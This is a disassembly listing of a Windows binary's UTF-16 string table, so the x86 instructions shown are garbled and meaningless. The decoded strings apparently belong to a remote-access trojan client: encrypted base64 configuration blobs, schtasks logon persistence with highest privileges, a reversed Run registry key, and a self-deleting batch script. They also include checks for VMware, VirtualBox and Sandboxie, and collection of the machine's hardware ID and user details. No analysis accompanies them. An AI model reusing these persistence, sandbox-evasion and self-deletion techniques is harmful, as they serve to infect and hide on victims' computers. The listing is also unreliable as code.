  40be95:	00 79 00             	add    %bh,0x0(%ecx)
  40be98:	52                   	push   %edx
  40be99:	00 35 00 36 00 6e    	add    %dh,0x6e003600
  40be9f:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
  40bea3:	00 49 00             	add    %cl,0x0(%ecx)
  40bea6:	2b 00                	sub    (%eax),%eax
  40bea8:	57                   	push   %edi
  40bea9:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  40bead:	00 61 00             	add    %ah,0x0(%ecx)
  40beb0:	75 00                	jne    0x40beb2
  40beb2:	4d                   	dec    %ebp
  40beb3:	00 6a 00             	add    %ch,0x0(%edx)
  40beb6:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  40beba:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40bebe:	50                   	push   %eax
  40bebf:	00 31                	add    %dh,(%ecx)
  40bec1:	00 65 00             	add    %ah,0x0(%ebp)
  40bec4:	57                   	push   %edi
  40bec5:	00 77 00             	add    %dh,0x0(%edi)
  40bec8:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40becd:	80 b1 6b 00 62 00 47 	xorb   $0x47,0x62006b(%ecx)
  40bed4:	00 78 00             	add    %bh,0x0(%eax)
  40bed7:	31 00                	xor    %eax,(%eax)
  40bed9:	75 00                	jne    0x40bedb
  40bedb:	61                   	popa
  40bedc:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  40bee0:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40bee4:	00 57 00             	add    %dl,0x0(%edi)
  40bee7:	72 00                	jb     0x40bee9
  40bee9:	54                   	push   %esp
  40beea:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40beee:	00 43 00             	add    %al,0x0(%ebx)
  40bef1:	63 00                	arpl   %eax,(%eax)
  40bef3:	4b                   	dec    %ebx
  40bef4:	00 73 00             	add    %dh,0x0(%ebx)
  40bef7:	57                   	push   %edi
  40bef8:	00 35 00 37 00 77    	add    %dh,0x77003700
  40befe:	00 71 00             	add    %dh,0x0(%ecx)
  40bf01:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  40bf05:	4a                   	dec    %edx
  40bf06:	00 30                	add    %dh,(%eax)
  40bf08:	00 55 00             	add    %dl,0x0(%ebp)
  40bf0b:	78 00                	js     0x40bf0d
  40bf0d:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40bf11:	5a                   	pop    %edx
  40bf12:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40bf16:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  40bf1a:	00 46 00             	add    %al,0x0(%esi)
  40bf1d:	67 00 66 00          	add    %ah,0x0(%bp)
  40bf21:	64 00 79 00          	add    %bh,%fs:0x0(%ecx)
  40bf25:	59                   	pop    %ecx
  40bf26:	00 58 00             	add    %bl,0x0(%eax)
  40bf29:	43                   	inc    %ebx
  40bf2a:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40bf2e:	00 71 00             	add    %dh,0x0(%ecx)
  40bf31:	4d                   	dec    %ebp
  40bf32:	00 54 00 4b          	add    %dl,0x4b(%eax,%eax,1)
  40bf36:	00 4f 00             	add    %cl,0x0(%edi)
  40bf39:	5a                   	pop    %edx
  40bf3a:	00 31                	add    %dh,(%ecx)
  40bf3c:	00 4a 00             	add    %cl,0x0(%edx)
  40bf3f:	61                   	popa
  40bf40:	00 61 00             	add    %ah,0x0(%ecx)
  40bf43:	72 00                	jb     0x40bf45
  40bf45:	6d                   	insl   (%dx),%es:(%edi)
  40bf46:	00 2b                	add    %ch,(%ebx)
  40bf48:	00 55 00             	add    %dl,0x0(%ebp)
  40bf4b:	66 00 38             	data16 add %bh,(%eax)
  40bf4e:	00 69 00             	add    %ch,0x0(%ecx)
  40bf51:	7a 00                	jp     0x40bf53
  40bf53:	75 00                	jne    0x40bf55
  40bf55:	37                   	aaa
  40bf56:	00 75 00             	add    %dh,0x0(%ebp)
  40bf59:	69 00 68 00 30 00    	imul   $0x300068,(%eax),%eax
  40bf5f:	33 00                	xor    (%eax),%eax
  40bf61:	50                   	push   %eax
  40bf62:	00 71 00             	add    %dh,0x0(%ecx)
  40bf65:	69 00 56 00 45 00    	imul   $0x450056,(%eax),%eax
  40bf6b:	41                   	inc    %ecx
  40bf6c:	00 56 00             	add    %dl,0x0(%esi)
  40bf6f:	68 00 62 00 58       	push   $0x58006200
  40bf74:	00 52 00             	add    %dl,0x0(%edx)
  40bf77:	53                   	push   %ebx
  40bf78:	00 51 00             	add    %dl,0x0(%ecx)
  40bf7b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40bf80:	80 b1 2f 00 30 00 36 	xorb   $0x36,0x30002f(%ecx)
  40bf87:	00 6f 00             	add    %ch,0x0(%edi)
  40bf8a:	2f                   	das
  40bf8b:	00 6d 00             	add    %ch,0x0(%ebp)
  40bf8e:	73 00                	jae    0x40bf90
  40bf90:	55                   	push   %ebp
  40bf91:	00 45 00             	add    %al,0x0(%ebp)
  40bf94:	4d                   	dec    %ebp
  40bf95:	00 43 00             	add    %al,0x0(%ebx)
  40bf98:	43                   	inc    %ebx
  40bf99:	00 51 00             	add    %dl,0x0(%ecx)
  40bf9c:	30 00                	xor    %al,(%eax)
  40bf9e:	6d                   	insl   (%dx),%es:(%edi)
  40bf9f:	00 57 00             	add    %dl,0x0(%edi)
  40bfa2:	6c                   	insb   (%dx),%es:(%edi)
  40bfa3:	00 78 00             	add    %bh,0x0(%eax)
  40bfa6:	4d                   	dec    %ebp
  40bfa7:	00 53 00             	add    %dl,0x0(%ebx)
  40bfaa:	67 00 6b 00          	add    %ch,0x0(%bp,%di)
  40bfae:	70 00                	jo     0x40bfb0
  40bfb0:	54                   	push   %esp
  40bfb1:	00 39                	add    %bh,(%ecx)
  40bfb3:	00 62 00             	add    %ah,0x0(%edx)
  40bfb6:	50                   	push   %eax
  40bfb7:	00 5a 00             	add    %bl,0x0(%edx)
  40bfba:	4b                   	dec    %ebx
  40bfbb:	00 57 00             	add    %dl,0x0(%edi)
  40bfbe:	31 00                	xor    %eax,(%eax)
  40bfc0:	6c                   	insb   (%dx),%es:(%edi)
  40bfc1:	00 46 00             	add    %al,0x0(%esi)
  40bfc4:	35 00 77 00 69       	xor    $0x69007700,%eax
  40bfc9:	00 37                	add    %dh,(%edi)
  40bfcb:	00 54 00 73          	add    %dl,0x73(%eax,%eax,1)
  40bfcf:	00 68 00             	add    %ch,0x0(%eax)
  40bfd2:	56                   	push   %esi
  40bfd3:	00 66 00             	add    %ah,0x0(%esi)
  40bfd6:	46                   	inc    %esi
  40bfd7:	00 41 00             	add    %al,0x0(%ecx)
  40bfda:	69 00 31 00 52 00    	imul   $0x520031,(%eax),%eax
  40bfe0:	55                   	push   %ebp
  40bfe1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bfe4:	6f                   	outsl  %ds:(%esi),(%dx)
  40bfe5:	00 6b 00             	add    %ch,0x0(%ebx)
  40bfe8:	53                   	push   %ebx
  40bfe9:	00 41 00             	add    %al,0x0(%ecx)
  40bfec:	36 00 39             	add    %bh,%ss:(%ecx)
  40bfef:	00 31                	add    %dh,(%ecx)
  40bff1:	00 6e 00             	add    %ch,0x0(%esi)
  40bff4:	6a 00                	push   $0x0
  40bff6:	76 00                	jbe    0x40bff8
  40bff8:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40bffc:	68 00 44 00 47       	push   $0x47004400
  40c001:	00 42 00             	add    %al,0x0(%edx)
  40c004:	6c                   	insb   (%dx),%es:(%edi)
  40c005:	00 6d 00             	add    %ch,0x0(%ebp)
  40c008:	45                   	inc    %ebp
  40c009:	00 35 00 51 00 66    	add    %dh,0x66005100
  40c00f:	00 43 00             	add    %al,0x0(%ebx)
  40c012:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40c016:	63 00                	arpl   %eax,(%eax)
  40c018:	74 00                	je     0x40c01a
  40c01a:	51                   	push   %ecx
  40c01b:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40c01f:	00 58 00             	add    %bl,0x0(%eax)
  40c022:	48                   	dec    %eax
  40c023:	00 75 00             	add    %dh,0x0(%ebp)
  40c026:	52                   	push   %edx
  40c027:	00 78 00             	add    %bh,0x0(%eax)
  40c02a:	45                   	inc    %ebp
  40c02b:	00 41 00             	add    %al,0x0(%ecx)
  40c02e:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c033:	03 33                	add    (%ebx),%esi
  40c035:	00 00                	add    %al,(%eax)
  40c037:	80 b1 62 00 35 00 78 	xorb   $0x78,0x350062(%ecx)
  40c03e:	00 52 00             	add    %dl,0x0(%edx)
  40c041:	54                   	push   %esp
  40c042:	00 61 00             	add    %ah,0x0(%ecx)
  40c045:	68 00 43 00 4b       	push   $0x4b004300
  40c04a:	00 46 00             	add    %al,0x0(%esi)
  40c04d:	58                   	pop    %eax
  40c04e:	00 76 00             	add    %dh,0x0(%esi)
  40c051:	38 00                	cmp    %al,(%eax)
  40c053:	75 00                	jne    0x40c055
  40c055:	67 00 64 00          	add    %ah,0x0(%si)
  40c059:	49                   	dec    %ecx
  40c05a:	00 4e 00             	add    %cl,0x0(%esi)
  40c05d:	4c                   	dec    %esp
  40c05e:	00 48 00             	add    %cl,0x0(%eax)
  40c061:	66 00 30             	data16 add %dh,(%eax)
  40c064:	00 56 00             	add    %dl,0x0(%esi)
  40c067:	55                   	push   %ebp
  40c068:	00 6a 00             	add    %ch,0x0(%edx)
  40c06b:	38 00                	cmp    %al,(%eax)
  40c06d:	42                   	inc    %edx
  40c06e:	00 57 00             	add    %dl,0x0(%edi)
  40c071:	61                   	popa
  40c072:	00 4a 00             	add    %cl,0x0(%edx)
  40c075:	4e                   	dec    %esi
  40c076:	00 50 00             	add    %dl,0x0(%eax)
  40c079:	74 00                	je     0x40c07b
  40c07b:	47                   	inc    %edi
  40c07c:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  40c080:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  40c084:	00 39                	add    %bh,(%ecx)
  40c086:	00 77 00             	add    %dh,0x0(%edi)
  40c089:	4e                   	dec    %esi
  40c08a:	00 6b 00             	add    %ch,0x0(%ebx)
  40c08d:	47                   	inc    %edi
  40c08e:	00 58 00             	add    %bl,0x0(%eax)
  40c091:	46                   	inc    %esi
  40c092:	00 6f 00             	add    %ch,0x0(%edi)
  40c095:	38 00                	cmp    %al,(%eax)
  40c097:	6c                   	insb   (%dx),%es:(%edi)
  40c098:	00 68 00             	add    %ch,0x0(%eax)
  40c09b:	38 00                	cmp    %al,(%eax)
  40c09d:	55                   	push   %ebp
  40c09e:	00 6e 00             	add    %ch,0x0(%esi)
  40c0a1:	4d                   	dec    %ebp
  40c0a2:	00 52 00             	add    %dl,0x0(%edx)
  40c0a5:	64 00 74 00 43       	add    %dh,%fs:0x43(%eax,%eax,1)
  40c0aa:	00 37                	add    %dh,(%edi)
  40c0ac:	00 33                	add    %dh,(%ebx)
  40c0ae:	00 6a 00             	add    %ch,0x0(%edx)
  40c0b1:	57                   	push   %edi
  40c0b2:	00 32                	add    %dh,(%edx)
  40c0b4:	00 74 00 55          	add    %dh,0x55(%eax,%eax,1)
  40c0b8:	00 49 00             	add    %cl,0x0(%ecx)
  40c0bb:	32 00                	xor    (%eax),%al
  40c0bd:	37                   	aaa
  40c0be:	00 51 00             	add    %dl,0x0(%ecx)
  40c0c1:	31 00                	xor    %eax,(%eax)
  40c0c3:	2b 00                	sub    (%eax),%eax
  40c0c5:	58                   	pop    %eax
  40c0c6:	00 49 00             	add    %cl,0x0(%ecx)
  40c0c9:	76 00                	jbe    0x40c0cb
  40c0cb:	51                   	push   %ecx
  40c0cc:	00 62 00             	add    %ah,0x0(%edx)
  40c0cf:	62 00                	bound  %eax,(%eax)
  40c0d1:	76 00                	jbe    0x40c0d3
  40c0d3:	37                   	aaa
  40c0d4:	00 47 00             	add    %al,0x0(%edi)
  40c0d7:	35 00 74 00 55       	xor    $0x55007400,%eax
  40c0dc:	00 68 00             	add    %ch,0x0(%eax)
  40c0df:	79 00                	jns    0x40c0e1
  40c0e1:	47                   	inc    %edi
  40c0e2:	00 67 00             	add    %ah,0x0(%edi)
  40c0e5:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40c0ea:	09 6e 00             	or     %ebp,0x0(%esi)
  40c0ed:	75 00                	jne    0x40c0ef
  40c0ef:	6c                   	insb   (%dx),%es:(%edi)
  40c0f0:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c0f4:	01 00                	add    %eax,(%eax)
  40c0f6:	03 3a                	add    (%edx),%edi
  40c0f8:	00 00                	add    %al,(%eax)
  40c0fa:	0d 50 00 61 00       	or     $0x610050,%eax
  40c0ff:	63 00                	arpl   %eax,(%eax)
  40c101:	6b 00 65             	imul   $0x65,(%eax),%eax
  40c104:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c108:	09 50 00             	or     %edx,0x0(%eax)
  40c10b:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40c111:	00 0f                	add    %cl,(%edi)
  40c113:	4d                   	dec    %ebp
  40c114:	00 65 00             	add    %ah,0x0(%ebp)
  40c117:	73 00                	jae    0x40c119
  40c119:	73 00                	jae    0x40c11b
  40c11b:	61                   	popa
  40c11c:	00 67 00             	add    %ah,0x0(%edi)
  40c11f:	65 00 00             	add    %al,%gs:(%eax)
  40c122:	07                   	pop    %es
  40c123:	63 00                	arpl   %eax,(%eax)
  40c125:	6d                   	insl   (%dx),%es:(%edi)
  40c126:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40c12a:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40c130:	00 73 00             	add    %dh,0x0(%ebx)
  40c133:	63 00                	arpl   %eax,(%eax)
  40c135:	68 00 74 00 61       	push   $0x61007400
  40c13a:	00 73 00             	add    %dh,0x0(%ebx)
  40c13d:	6b 00 73             	imul   $0x73,(%eax),%eax
  40c140:	00 20                	add    %ah,(%eax)
  40c142:	00 2f                	add    %ch,(%edi)
  40c144:	00 63 00             	add    %ah,0x0(%ebx)
  40c147:	72 00                	jb     0x40c149
  40c149:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40c14d:	74 00                	je     0x40c14f
  40c14f:	65 00 20             	add    %ah,%gs:(%eax)
  40c152:	00 2f                	add    %ch,(%edi)
  40c154:	00 66 00             	add    %ah,0x0(%esi)
  40c157:	20 00                	and    %al,(%eax)
  40c159:	2f                   	das
  40c15a:	00 73 00             	add    %dh,0x0(%ebx)
  40c15d:	63 00                	arpl   %eax,(%eax)
  40c15f:	20 00                	and    %al,(%eax)
  40c161:	6f                   	outsl  %ds:(%esi),(%dx)
  40c162:	00 6e 00             	add    %ch,0x0(%esi)
  40c165:	6c                   	insb   (%dx),%es:(%edi)
  40c166:	00 6f 00             	add    %ch,0x0(%edi)
  40c169:	67 00 6f 00          	add    %ch,0x0(%bx)
  40c16d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c16e:	00 20                	add    %ah,(%eax)
  40c170:	00 2f                	add    %ch,(%edi)
  40c172:	00 72 00             	add    %dh,0x0(%edx)
  40c175:	6c                   	insb   (%dx),%es:(%edi)
  40c176:	00 20                	add    %ah,(%eax)
  40c178:	00 68 00             	add    %ch,0x0(%eax)
  40c17b:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40c181:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40c185:	74 00                	je     0x40c187
  40c187:	20 00                	and    %al,(%eax)
  40c189:	2f                   	das
  40c18a:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40c18e:	00 20                	add    %ah,(%eax)
  40c190:	00 22                	add    %ah,(%edx)
  40c192:	00 00                	add    %al,(%eax)
  40c194:	11 22                	adc    %esp,(%edx)
  40c196:	00 20                	add    %ah,(%eax)
  40c198:	00 2f                	add    %ch,(%edi)
  40c19a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40c19e:	00 20                	add    %ah,(%eax)
  40c1a0:	00 27                	add    %ah,(%edi)
  40c1a2:	00 22                	add    %ah,(%edx)
  40c1a4:	00 01                	add    %al,(%ecx)
  40c1a6:	13 22                	adc    (%edx),%esp
  40c1a8:	00 27                	add    %ah,(%edi)
  40c1aa:	00 20                	add    %ah,(%eax)
  40c1ac:	00 26                	add    %ah,(%esi)
  40c1ae:	00 20                	add    %ah,(%eax)
  40c1b0:	00 65 00             	add    %ah,0x0(%ebp)
  40c1b3:	78 00                	js     0x40c1b5
  40c1b5:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40c1bb:	5c                   	pop    %esp
  40c1bc:	00 6e 00             	add    %ch,0x0(%esi)
  40c1bf:	75 00                	jne    0x40c1c1
  40c1c1:	52                   	push   %edx
  40c1c2:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40c1c6:	00 6f 00             	add    %ch,0x0(%edi)
  40c1c9:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40c1cf:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40c1d3:	74 00                	je     0x40c1d5
  40c1d5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1d6:	00 65 00             	add    %ah,0x0(%ebp)
  40c1d9:	72 00                	jb     0x40c1db
  40c1db:	72 00                	jb     0x40c1dd
  40c1dd:	75 00                	jne    0x40c1df
  40c1df:	43                   	inc    %ebx
  40c1e0:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40c1e4:	00 77 00             	add    %dh,0x0(%edi)
  40c1e7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1e8:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40c1ec:	00 69 00             	add    %ch,0x0(%ecx)
  40c1ef:	57                   	push   %edi
  40c1f0:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40c1f4:	00 66 00             	add    %ah,0x0(%esi)
  40c1f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1f8:	00 73 00             	add    %dh,0x0(%ebx)
  40c1fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1fc:	00 72 00             	add    %dh,0x0(%edx)
  40c1ff:	63 00                	arpl   %eax,(%eax)
  40c201:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40c207:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c20b:	61                   	popa
  40c20c:	00 77 00             	add    %dh,0x0(%edi)
  40c20f:	74 00                	je     0x40c211
  40c211:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c215:	53                   	push   %ebx
  40c216:	00 00                	add    %al,(%eax)
  40c218:	03 22                	add    (%edx),%esp
  40c21a:	00 00                	add    %al,(%eax)
  40c21c:	09 2e                	or     %ebp,(%esi)
  40c21e:	00 62 00             	add    %ah,0x0(%edx)
  40c221:	61                   	popa
  40c222:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40c226:	13 40 00             	adc    0x0(%eax),%eax
  40c229:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40c22d:	68 00 6f 00 20       	push   $0x20006f00
  40c232:	00 6f 00             	add    %ch,0x0(%edi)
  40c235:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40c239:	00 1f                	add    %bl,(%edi)
  40c23b:	74 00                	je     0x40c23d
  40c23d:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40c243:	6f                   	outsl  %ds:(%esi),(%dx)
  40c244:	00 75 00             	add    %dh,0x0(%ebp)
  40c247:	74 00                	je     0x40c249
  40c249:	20 00                	and    %al,(%eax)
  40c24b:	33 00                	xor    (%eax),%eax
  40c24d:	20 00                	and    %al,(%eax)
  40c24f:	3e 00 20             	add    %ah,%ds:(%eax)
  40c252:	00 4e 00             	add    %cl,0x0(%esi)
  40c255:	55                   	push   %ebp
  40c256:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c25a:	15 53 00 54 00       	adc    $0x540053,%eax
  40c25f:	41                   	inc    %ecx
  40c260:	00 52 00             	add    %dl,0x0(%edx)
  40c263:	54                   	push   %esp
  40c264:	00 20                	add    %ah,(%eax)
  40c266:	00 22                	add    %ah,(%edx)
  40c268:	00 22                	add    %ah,(%edx)
  40c26a:	00 20                	add    %ah,(%eax)
  40c26c:	00 22                	add    %ah,(%edx)
  40c26e:	00 00                	add    %al,(%eax)
  40c270:	07                   	pop    %es
  40c271:	43                   	inc    %ebx
  40c272:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40c276:	00 00                	add    %al,(%eax)
  40c278:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40c27c:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40c280:	00 22                	add    %ah,(%edx)
  40c282:	00 00                	add    %al,(%eax)
  40c284:	0f 22 00             	mov    %eax,%cr0
  40c287:	20 00                	and    %al,(%eax)
  40c289:	2f                   	das
  40c28a:	00 66 00             	add    %ah,0x0(%esi)
  40c28d:	20 00                	and    %al,(%eax)
  40c28f:	2f                   	das
  40c290:	00 71 00             	add    %dh,0x0(%ecx)
  40c293:	00 05 78 00 70 00    	add    %al,0x700078
  40c299:	00 45 53             	add    %al,0x53(%ebp)
  40c29c:	00 65 00             	add    %ah,0x0(%ebp)
  40c29f:	6c                   	insb   (%dx),%es:(%edi)
  40c2a0:	00 65 00             	add    %ah,0x0(%ebp)
  40c2a3:	63 00                	arpl   %eax,(%eax)
  40c2a5:	74 00                	je     0x40c2a7
  40c2a7:	20 00                	and    %al,(%eax)
  40c2a9:	2a 00                	sub    (%eax),%al
  40c2ab:	20 00                	and    %al,(%eax)
  40c2ad:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40c2b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2b2:	00 6d 00             	add    %ch,0x0(%ebp)
  40c2b5:	20 00                	and    %al,(%eax)
  40c2b7:	57                   	push   %edi
  40c2b8:	00 69 00             	add    %ch,0x0(%ecx)
  40c2bb:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2bc:	00 33                	add    %dh,(%ebx)
  40c2be:	00 32                	add    %dh,(%edx)
  40c2c0:	00 5f 00             	add    %bl,0x0(%edi)
  40c2c3:	43                   	inc    %ebx
  40c2c4:	00 6f 00             	add    %ch,0x0(%edi)
  40c2c7:	6d                   	insl   (%dx),%es:(%edi)
  40c2c8:	00 70 00             	add    %dh,0x0(%eax)
  40c2cb:	75 00                	jne    0x40c2cd
  40c2cd:	74 00                	je     0x40c2cf
  40c2cf:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2d3:	53                   	push   %ebx
  40c2d4:	00 79 00             	add    %bh,0x0(%ecx)
  40c2d7:	73 00                	jae    0x40c2d9
  40c2d9:	74 00                	je     0x40c2db
  40c2db:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40c2df:	00 19                	add    %bl,(%ecx)
  40c2e1:	4d                   	dec    %ebp
  40c2e2:	00 61 00             	add    %ah,0x0(%ecx)
  40c2e5:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2e6:	00 75 00             	add    %dh,0x0(%ebp)
  40c2e9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40c2ed:	63 00                	arpl   %eax,(%eax)
  40c2ef:	74 00                	je     0x40c2f1
  40c2f1:	75 00                	jne    0x40c2f3
  40c2f3:	72 00                	jb     0x40c2f5
  40c2f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c2f9:	00 2b                	add    %ch,(%ebx)
  40c2fb:	6d                   	insl   (%dx),%es:(%edi)
  40c2fc:	00 69 00             	add    %ch,0x0(%ecx)
  40c2ff:	63 00                	arpl   %eax,(%eax)
  40c301:	72 00                	jb     0x40c303
  40c303:	6f                   	outsl  %ds:(%esi),(%dx)
  40c304:	00 73 00             	add    %dh,0x0(%ebx)
  40c307:	6f                   	outsl  %ds:(%esi),(%dx)
  40c308:	00 66 00             	add    %ah,0x0(%esi)
  40c30b:	74 00                	je     0x40c30d
  40c30d:	20 00                	and    %al,(%eax)
  40c30f:	63 00                	arpl   %eax,(%eax)
  40c311:	6f                   	outsl  %ds:(%esi),(%dx)
  40c312:	00 72 00             	add    %dh,0x0(%edx)
  40c315:	70 00                	jo     0x40c317
  40c317:	6f                   	outsl  %ds:(%esi),(%dx)
  40c318:	00 72 00             	add    %dh,0x0(%edx)
  40c31b:	61                   	popa
  40c31c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40c320:	00 6f 00             	add    %ch,0x0(%edi)
  40c323:	6e                   	outsb  %ds:(%esi),(%dx)
  40c324:	00 00                	add    %al,(%eax)
  40c326:	0b 4d 00             	or     0x0(%ebp),%ecx
  40c329:	6f                   	outsl  %ds:(%esi),(%dx)
  40c32a:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40c32e:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c332:	0f 56 00             	orps   (%eax),%xmm0
  40c335:	49                   	dec    %ecx
  40c336:	00 52 00             	add    %dl,0x0(%edx)
  40c339:	54                   	push   %esp
  40c33a:	00 55 00             	add    %dl,0x0(%ebp)
  40c33d:	41                   	inc    %ecx
  40c33e:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40c342:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40c347:	77 00                	ja     0x40c349
  40c349:	61                   	popa
  40c34a:	00 72 00             	add    %dh,0x0(%edx)
  40c34d:	65 00 00             	add    %al,%gs:(%eax)
  40c350:	15 56 00 69 00       	adc    $0x690056,%eax
  40c355:	72 00                	jb     0x40c357
  40c357:	74 00                	je     0x40c359
  40c359:	75 00                	jne    0x40c35b
  40c35b:	61                   	popa
  40c35c:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40c360:	00 6f 00             	add    %ch,0x0(%edi)
  40c363:	78 00                	js     0x40c365
  40c365:	00 17                	add    %dl,(%edi)
  40c367:	53                   	push   %ebx
  40c368:	00 62 00             	add    %ah,0x0(%edx)
  40c36b:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40c371:	6c                   	insb   (%dx),%es:(%edi)
  40c372:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40c376:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40c37a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40c37e:	11 45 00             	adc    %eax,0x0(%ebp)
  40c381:	72 00                	jb     0x40c383
  40c383:	72 00                	jb     0x40c385
  40c385:	20 00                	and    %al,(%eax)
  40c387:	48                   	dec    %eax
  40c388:	00 57 00             	add    %dl,0x0(%edi)
  40c38b:	49                   	dec    %ecx
  40c38c:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c390:	05 78 00 32 00       	add    $0x320078,%eax
  40c395:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40c39b:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40c3a1:	74 00                	je     0x40c3a3
  40c3a3:	49                   	dec    %ecx
  40c3a4:	00 6e 00             	add    %ch,0x0(%esi)
  40c3a7:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40c3ab:	00 09                	add    %cl,(%ecx)
  40c3ad:	48                   	dec    %eax
  40c3ae:	00 57 00             	add    %dl,0x0(%edi)
  40c3b1:	49                   	dec    %ecx
  40c3b2:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40c3b6:	09 55 00             	or     %edx,0x0(%ebp)
  40c3b9:	73 00                	jae    0x40c3bb
  40c3bb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40c3bf:	00 05 4f 00 53 00    	add    %al,0x53004f
  40c3c5:	00 13                	add    %dl,(%ebx)
  40c3c7:	4d                   	dec    %ebp
  40c3c8:	00 69 00             	add    %ch,0x0(%ecx)
  40c3cb:	63 00                	arpl   %eax,(%eax)
  40c3cd:	72 00                	jb     0x40c3cf
  40c3cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d0:	00 73 00             	add    %dh,0x0(%ebx)
  40c3d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c3d4:	00 66 00             	add    %ah,0x0(%esi)
  40c3d7:	74 00                	je     0x40c3d9
  40c3d9:	00 03                	add    %al,(%ebx)
  40c3db:	20 00                	and    %al,(%eax)
  40c3dd:	00 09                	add    %cl,(%ecx)
  40c3df:	54                   	push   %esp
  40c3e0:	00 72 00             	add    %dh,0x0(%edx)
  40c3e3:	75 00                	jne    0x40c3e5
  40c3e5:	65 00 00             	add    %al,%gs:(%eax)
  40c3e8:	0b 36                	or     (%esi),%esi
  40c3ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  40c3ed:	62 00                	bound  %eax,(%eax)
  40c3ef:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40c3f5:	46                   	inc    %esi
  40c3f6:	00 61 00             	add    %ah,0x0(%ecx)
  40c3f9:	6c                   	insb   (%dx),%es:(%edi)
  40c3fa:	00 73 00             	add    %dh,0x0(%ebx)
  40c3fd:	65 00 00             	add    %al,%gs:(%eax)
  40c400:	0b 33                	or     (%ebx),%esi
  40c402:	00 32                	add    %dh,(%edx)
  40c404:	00 62 00             	add    %ah,0x0(%edx)
  40c407:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40c40d:	50                   	push   %eax
  40c40e:	00 61 00             	add    %ah,0x0(%ecx)
  40c411:	74 00                	je     0x40c413
  40c413:	68 00 00 0f 56       	push   $0x560f0000
  40c418:	00 65 00             	add    %ah,0x0(%ebp)
